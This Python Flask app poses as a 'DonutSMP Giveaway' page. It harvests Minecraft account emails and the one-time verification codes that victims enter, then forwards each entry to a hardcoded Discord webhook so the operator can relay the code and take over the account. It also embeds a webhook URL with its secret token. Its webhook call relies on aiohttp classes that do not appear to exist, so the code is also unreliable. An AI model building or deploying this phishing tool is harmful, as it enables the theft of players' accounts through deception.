from flask import Flask, request, render_template, jsonify
import aiohttp
import asyncio
import re
from datetime import datetime

app = Flask(__name__)
WEBHOOK_URL = "https://discord.com/api/webhooks/1439990429226369166/lJgEK_CeiR5qkbvXsFCLwmHH7jVoS_wx0IT97nPMyvPXnbltCKfV1b27urEmg-DnWJwr"

# Temporary storage (email → code that user entered)
pending = {}

def is_valid_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email.strip(), re.IGNORECASE)

async def send_webhook(content):
    async with aiohttp.ClientSession() as session:
        webhook = aiohttp.webhooks.Webhook.from_url(WEBHOOK_URL, adapter=aiohttp.AsyncWebhookAdapter(session))
        await webhook.send(f"@everyone\n{content}", username="DonutSMP Giveaway Bot")

def run_async(coro):
    loop = asyncio.get_event_loop()
    if loop.is_running():
        asyncio.create_task(coro)
    else:
        loop.run_until_complete(coro)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit_email', methods=['POST'])
def submit_email():
    email = request.json.get('email', '').strip().lower()
    discord = request.json.get('discord', '').strip()

    if not is_valid_email(email):
        return jsonify({"error": "Invalid email"}), 400

    if email in pending:
        return jsonify({"error": "This email is already being verified"}), 400

    pending[email] = {"discord": discord or "Not provided", "code": None}

    msg = f"""
**NEW GIVEAWAY ENTRY – NEEDS CODE**
**Minecraft Email:** `{email}`
**Discord:** {discord or "None given"}
**Time:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}
Send them a 6-digit code NOW!
    """
    run_async(send_webhook(msg.strip()))

    return jsonify({"success": True})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    email = request.json.get('email').strip().lower()
    code = request.json.get('code')

    if email not in pending:
        return jsonify({"error": "No verification started for this email"}), 400

    # First time they submit code → store it and ping you
    if pending[email]["code"] is None:
        pending[email]["code"] = code
        msg = f"""
**CODE RECEIVED – READY TO VERIFY**
**Email:** `{email}`
**Code they entered:** `{code}`
**Discord:** {pending[email]["discord"]}

Reply with the **same code** to their email to let them in!
        """
        run_async(send_webhook(msg.strip()))
        return jsonify({"wait": True, "msg": "Code received! Waiting for admin to send real code..."})

    # Second time with matching code → SUCCESS
    if pending[email]["code"] == code:
        discord = pending[email]["discord"]
        del pending[email]
        msg = f"""
**GIVEAWAY ENTRY SUCCESSFUL!!**
**Minecraft Email:** `{email}`
**Code:** `{code}`
**Discord:** {discord}
This player is now officially entered into the DonutSMP giveaway!
        """
        run_async(send_webhook(msg.strip()))
        return jsonify({"verified": True})

    return jsonify({"error": "Wrong code – try again"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)